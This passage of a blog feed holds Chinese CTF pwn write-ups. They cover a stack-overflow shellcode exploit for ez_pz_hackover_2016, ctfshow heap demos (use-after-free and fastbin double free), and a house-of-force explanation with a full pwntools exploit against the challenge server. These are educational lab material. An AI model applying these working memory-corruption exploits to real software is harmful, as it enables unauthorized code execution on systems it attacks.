p32(0xb)</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080493e1) # int 0x80</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>ez_pz_hackover_2016(debug计算shell位置)</title>
    <url>/2025/02/20/ez-pz-hackover-2016-debug%E8%AE%A1%E7%AE%97shell%E4%BD%8D%E7%BD%AE/</url>
    <content><![CDATA[<ol>
<li><p>直接写思路</p>
<ul>
<li>1.没有直接的&#x2F;bin&#x2F;sh</li>
<li>2.没有格式化字符串</li>
</ul>
<p><img src="/2025/02/20/ez-pz-hackover-2016-debug%E8%AE%A1%E7%AE%97shell%E4%BD%8D%E7%BD%AE/1.png" alt="1"></p>
</li>
</ol>
<p>​    缓冲区溢出风险：即使n小于等于50（即dest数组的大小），因为src只是一个字符（1字节），试图读取超过1字节的数据会导致访问越    </p>
<p>​    界。如果n大于50，不仅会访问越界，还会写入超出dest数组范围的内存，导致缓冲区溢出。(有栈溢出可以利用)</p>
<ol start="2">
<li><p>我们可以利用栈溢出写入shellcode,不过得先，输入crashme进入vuln</p>
<p><img src="/2025/02/20/ez-pz-hackover-2016-debug%E8%AE%A1%E7%AE%97shell%E4%BD%8D%E7%BD%AE/2.png" alt="2"></p>
</li>
<li><p>计算shellcode所在的位置<br>先在vuln找到一个nop的地址<br><img src="/2025/02/20/ez-pz-hackover-2016-debug%E8%AE%A1%E7%AE%97shell%E4%BD%8D%E7%BD%AE/3.png" alt="3"></p>
</li>
</ol>
<p>​      在这个地方下断点，再用gdb,先输入crashme，再查栈 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stack 20</span><br></pre></td></tr></table></figure>

<p>​      <img src="/2025/02/20/ez-pz-hackover-2016-debug%E8%AE%A1%E7%AE%97shell%E4%BD%8D%E7%BD%AE/4.png" alt="4"></p>
<p>​      可以看到输入起始位置0x22而ebp的位置在0x38</p>
<p>​      远程连接可以直接得到输入的地址,但是地址会变化，偏移不会变化。<br>​      <img src="/2025/02/20/ez-pz-hackover-2016-debug%E8%AE%A1%E7%AE%97shell%E4%BD%8D%E7%BD%AE/5.png" alt="5"></p>
<ol start="4">
<li><p>思路就是在ebp后写入shellcode</p>
<p>我们已经知道了输入地址和ebp的距离是0x38-0x22,可以进行填充<br>我们还要算出shellcode的写入位置</p>
<p><img src="/2025/02/20/ez-pz-hackover-2016-debug%E8%AE%A1%E7%AE%97shell%E4%BD%8D%E7%BD%AE/6.png" alt="6"></p>
</li>
</ol>
<p>​     <img src="/2025/02/20/ez-pz-hackover-2016-debug%E8%AE%A1%E7%AE%97shell%E4%BD%8D%E7%BD%AE/7.png" alt="7"></p>
<p>所以shellcode的位置就是s的初始地址：0xffffcc0c - 0xffffcbf0（0x5c-0x40 &#x3D; 0x1c）</p>
<p>给出exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#r = remote(&#x27;node5.buuoj.cn&#x27;, 29139)  # 连接到远程服务器</span><br><span class="line">r = process(&quot;./ez_pz_hackover_2016&quot;)</span><br><span class="line">shellcode = asm(shellcraft.sh())  # 生成shellcode</span><br><span class="line">r.recvuntil(&quot;crash: &quot;)  # 接收直到&quot;crash: &quot;</span><br><span class="line">addr = int(r.recv(10), 16)  # 接收10个字节并转换为十六进制地址</span><br><span class="line"># 8是crashme\x00(8个字节)；4是ret(4个字节) </span><br><span class="line">payload = b&#x27;crashme\x00&#x27;+b&#x27;a&#x27; * (0x38 - 0x22 - 8 +4) + p32(addr - 0x1c) + shellcode  # 构造payload</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()  # 进入交互模式</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><img src="/2025/02/20/ez-pz-hackover-2016-debug%E8%AE%A1%E7%AE%97shell%E4%BD%8D%E7%BD%AE/8.png" alt="8"></li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/01/17/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>ctfshow pwn145-158</title>
    <url>/2025/07/27/ctfshow-pwn145-158/</url>
    <content><![CDATA[<h2 id="pwn-145"><a href="#pwn-145" class="headerlink" title="pwn 145"></a>pwn 145</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Why it can UAF(use after free) ?                        </span><br><span class="line">    * *************************************                           </span><br><span class="line">演示glibc 的分配机制</span><br><span class="line">glibc 使用首次适应算法选择空闲的堆块</span><br><span class="line">如果有一个空闲堆块且足够大，那么 malloc 将选择它</span><br><span class="line">如果存在 use-after-free 的情况那可以利用这一特性</span><br><span class="line">首先申请两个比较大的 chunk</span><br><span class="line">第一个 a = malloc(0x512) 在: 0x18f5260</span><br><span class="line">第二个 b = malloc(0x256) 在: 0x18f5780</span><br><span class="line">我们可以继续分配它</span><br><span class="line">现在我们把 &quot;AAAAAAAA&quot; 这个字符串写到 a 那里 </span><br><span class="line">第一次申请的 0x18f5260 指向 AAAAAAAA</span><br><span class="line">接下来 free 掉第一个...</span><br><span class="line">接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: 0x18f5260</span><br><span class="line">第三次 c = malloc(0x500) 在: 0x18f5260</span><br><span class="line">我们这次往里写一串 &quot;CCCCCCCC&quot; 到刚申请的 c 中</span><br><span class="line">第三次申请的 c 0x18f5260 指向 CCCCCCCC</span><br><span class="line">第一次申请的 a 0x18f5260 指向 CCCCCCCC</span><br><span class="line">可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 &quot;CCCCCCCC&quot;</span><br><span class="line">sh</span><br><span class="line">cat ctfshow_flag</span><br><span class="line">ctfshow&#123;3f139a53-9718-4b95-936c-a73c2296849b&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn146"><a href="#pwn146" class="headerlink" title="pwn146"></a>pwn146</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Why it can UAF(use after free) ?                        </span><br><span class="line">    * *************************************                           </span><br><span class="line">申请0x20大小的内存p1 的地址: 0x13ba010</span><br><span class="line">把p1[1]赋值为Printf函数，然后打印出&quot;Hello CTFshow&quot;</span><br><span class="line">Hello CTFshow</span><br><span class="line"></span><br><span class="line">free 掉 p1</span><br><span class="line">因为并没有置为null，所以p1[1]仍然是Printf函数，仍然可以输出打印了&quot;Hello CTFshow again&quot;</span><br><span class="line">Hello CTFshow again</span><br><span class="line">接下来再去malloc一个p2，会把释放掉的p1给分配出来，可以看到他俩是同一地址的</span><br><span class="line">p2 的地址: 0x13ba010</span><br><span class="line">p1 的地址: 0x13ba010</span><br><span class="line">然后把p2[1]给改成demoflag也就是system函数</span><br><span class="line"></span><br><span class="line">Then get the flag &amp;&amp; enjoy it !</span><br><span class="line"></span><br><span class="line">$sh</span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;5247ed61-a52c-4a9d-8dcd-53b8467a17ec&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn147"><a href="#pwn147" class="headerlink" title="pwn147"></a>pwn147</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Fastbin_dup -- Double free                              </span><br><span class="line">    * *************************************                           </span><br><span class="line">演示 fastbin 的 double free</span><br><span class="line">首先申请 3 个 chunk</span><br><span class="line">第一个 malloc(8): 0x1b39010</span><br><span class="line">第二个 malloc(8): 0x1b39030</span><br><span class="line">第三个 malloc(8): 0x1b39050</span><br><span class="line">free 掉第一个</span><br><span class="line">当我们再次 free 0x1b39010 的时候, 程序将会崩溃因为 0x1b39010 在 free 链表的第一个位置上</span><br><span class="line">我们先 free 0x1b39030.</span><br><span class="line">现在我们就可以再次 free 0x1b39010 了, 因为他现在不在 free 链表的第一个位置上</span><br><span class="line">现在空闲链表是这样的 [ 0x1b39010, 0x1b39030, 0x1b39010 ]. 如果我们 malloc 三次, 我们会得到两次 0x1b39010 </span><br><span class="line">第一次 malloc(8): 0x1b39010</span><br><span class="line">第二次 malloc(8): 0x1b39030</span><br><span class="line">第三次 malloc(8): 0x1b39010</span><br><span class="line">$sh </span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;7dbdfb56-d36a-42a8-a804-0e990d4d61dc&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn148"><a href="#pwn148" class="headerlink" title="pwn148"></a>pwn148</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Fastbin_dup_into_stack -- Double free                   </span><br><span class="line">    * *************************************                           </span><br><span class="line">通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）</span><br><span class="line">通过 malloc 申请到 0x7ffe9bec2270.</span><br><span class="line">先申请3 个 chunk</span><br><span class="line">chunk a: 0x25dd010</span><br><span class="line">chunk b: 0x25dd030</span><br><span class="line">chunk c: 0x25dd050</span><br><span class="line">free 掉 chunk a</span><br><span class="line">如果还对 0x25dd010 进行 free, 程序会崩溃。因为 0x25dd010 现在是 fastbin 的第一个</span><br><span class="line">先对 b 0x25dd030 进行 free</span><br><span class="line">接下来就可以对 0x25dd010 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了</span><br><span class="line">现在 fastbin 的链表是 [ 0x25dd010, 0x25dd030, 0x25dd010 ] 接下来通过修改 0x25dd010 上的内容来进行攻击.</span><br><span class="line">第一次 malloc(8): 0x25dd010</span><br><span class="line">第二次 malloc(8): 0x25dd030</span><br><span class="line">现在 fastbin 表中只剩 [ 0x25dd010 ] 了</span><br><span class="line">接下来往 0x25dd010 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去</span><br><span class="line">现在覆盖 0x25dd010 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置</span><br><span class="line">第三次 malloc(8): 0x25dd010, 把栈地址放到 fastbin 链表中</span><br><span class="line">这一次 malloc(8) 就申请到了栈上去: 0x7ffe9bec2270</span><br><span class="line">$sh</span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;f7fdefd4-fab4-4a29-96b0-8ccb6f648dc1&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn149"><a href="#pwn149" class="headerlink" title="pwn149"></a>pwn149</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linkpwn@linkpwn-VMware-Virtual-Platform:~$ nc pwn.challenge.ctf.show 28266</span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Fastbin_dup_consolidate                                 </span><br><span class="line">    * *************************************                           </span><br><span class="line">申请两个 fastbin 范围内的 chunk: p1=0x197a010 p2=0x197a030</span><br><span class="line">先 free p1</span><br><span class="line">去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=0x197a050</span><br><span class="line">因为 malloc_consolidate(), p1 会被放到 unsorted bin 中</span><br><span class="line">这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free</span><br><span class="line">现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: 0x197a010 0x197a010</span><br><span class="line">$sh </span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;2f30058c-812f-4649-9b5d-6298c5144bba&#125;</span><br></pre></td></tr></table></figure>

<p>写着写着发现一直写这个营养价值太低了，先停下把，以后发现了营养再来写。</p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>heap</category>
      </categories>
  </entry>
  <entry>
    <title>house of force</title>
    <url>/2025/07/16/house-of-force/</url>
    <content><![CDATA[<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>原理：</p>
<ol>
<li>核心目标： 将 Top Chunk 移动到任意可控地址，从而允许后续从该地址分配“堆块”，实现对该地址及其之后内存的任意读写。</li>
<li>攻击原理： 利用 <code>malloc</code> 在从 Top Chunk 分配内存时，仅根据用户请求的大小 <code>nb</code> 和当前 Top Chunk 的大小 <code>top_size</code> 来更新 Top Chunk 位置的机制（<code>new_top = old_top + nb</code>）。通过篡改 Top Chunk 的 <code>size</code> 字段为一个极大值（通常是 <code>-1</code>，即 <code>0xFFFFFFFFFFFFFFFF</code>），并精心构造一个超大的 <code>nb</code>，使得计算出的 <code>new_top</code> 指向攻击者期望的目标地址。</li>
<li>使用前提：<ol>
<li>堆块大小控制自由： 攻击者能够申请任意大小的堆块（<code>malloc(nb)</code> 中的 <code>nb</code> 可以非常大）。</li>
<li>Top Chunk Size 篡改： 存在漏洞（通常是堆溢出）允许攻击者覆盖 Top Chunk 的 <code>size</code> 字段，将其修改为一个极大的值（例如 <code>0xFFFFFFFFFFFFFFFF</code>）。</li>
<li>地址信息已知（通常需要）：攻击者需要知道：<ul>
<li>当前 Top Chunk 的地址 (<code>old_top</code>):用于计算所需的偏移量。</li>
<li>目标地址 (<code>target_addr</code>): 希望将 Top Chunk 移动到的地址。</li>
</ul>
</li>
<li>特殊情况 - 仅需偏移量： 如果目标地址 (<code>target_addr</code>) 本身位于堆内存区域内（例如，想要覆盖堆上的某个特定结构体或指针），那么攻击者<strong>不一定</strong>需要知道 <code>old_top</code> 和 <code>target_addr</code> 的绝对地址。只需要知道它们之间的偏移量 (<code>offset = target_addr - old_top</code>) 即可。这在某些堆布局已知或可控的场景下是可行的。</li>
</ol>
</li>
</ol>
<p>例题：</p>
<p>ctfshow pwn143</p>
<p>edit()存在漏洞</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v1 = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_6020A8 + <span class="number">2</span> * v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of name:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, nptr, <span class="number">8uLL</span>);</span><br><span class="line">      v2 = atoi(nptr);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name:&quot;</span>);</span><br><span class="line">      *(_BYTE *)(*((_QWORD *)&amp;unk_6020A8 + <span class="number">2</span> * v1) + (<span class="type">int</span>)read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;unk_6020A8 + <span class="number">2</span> * v1), v2)) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nothing here~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个edit函数没有检查输入长度的大小，完全由自己决定，存在堆溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">fffffffffffffffffffffffffffffffffflag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x64u</span>LL);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在后门函数。</p>
<p>所以我利用堆溢出，把top_chunk的size改成极大值，再把v4[1]的地址换成后门函数的地址就可以得到flag了，(为什么是v4[1]呢，因为</p>
<p>执行edit前都会执行v4[1]，把v4[1]的地址换成后门函数的地址，就可以执行后门函数了)。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置运行环境</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三种连接方式，按需启用</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28219</span>)  <span class="comment"># 远程连接</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)  # 本地运行</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./pwn&#x27;, &#x27;b main&#x27;)  # GDB调试</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载二进制文件</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># 获取flag符号的地址（目标覆盖地址）</span></span><br><span class="line">flag_addr = elf.sym[<span class="string">&#x27;fffffffffffffffffffffffffffffffffflag&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length:&#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the name:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length of name:&#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the new name:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_prog</span>():</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 漏洞利用流程 =====</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 创建初始chunk</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;chunk0&#x27;</span>)  <span class="comment"># 分配0x40大小的chunk（含头部）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 修改top chunk大小</span></span><br><span class="line"><span class="comment"># 覆盖top chunk的size字段为极大值(0xFFFFFFFFFFFFFFFF)</span></span><br><span class="line"><span class="comment"># 布局: [chunk0数据(0x30)] + [填充(0x8)] + [size字段(0x8)]</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 计算负偏移实现指针回退</span></span><br><span class="line"><span class="comment"># 偏移计算: flag_addr - (top_chunk_addr + 0x10)</span></span><br><span class="line"><span class="comment"># 实际计算: -(0x60 + 0x8 + 0xf) = -0x77 (需根据实际调试调整)</span></span><br><span class="line">offset = -(<span class="number">0x60</span> + <span class="number">0x8</span> + <span class="number">0xf</span>)</span><br><span class="line">add(offset, <span class="string">&#x27;trigger&#x27;</span>)  <span class="comment"># 申请负大小chunk触发整数溢出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 在目标地址分配chunk</span></span><br><span class="line"><span class="comment"># 此时top chunk指针已回退到flag_addr附近</span></span><br><span class="line"><span class="comment"># 分配0x10大小的chunk，其数据区将位于flag_addr处</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(flag_addr)*<span class="number">2</span>)  <span class="comment"># 用flag地址覆盖目标内存</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 触发flag读取</span></span><br><span class="line">exit_prog()  <span class="comment"># 退出程序（可能触发flag输出）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取交互控制权</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>再动调中更容易理解</p>
<p>add(0x30, ‘chunk0’)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)   //v4</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd2b0</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)   //add(0x30, &#x27;chunk0&#x27;)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x91fd2f0</span><br><span class="line">Size: 0x20d10 (with flag bits: 0x20d11)   </span><br></pre></td></tr></table></figure>

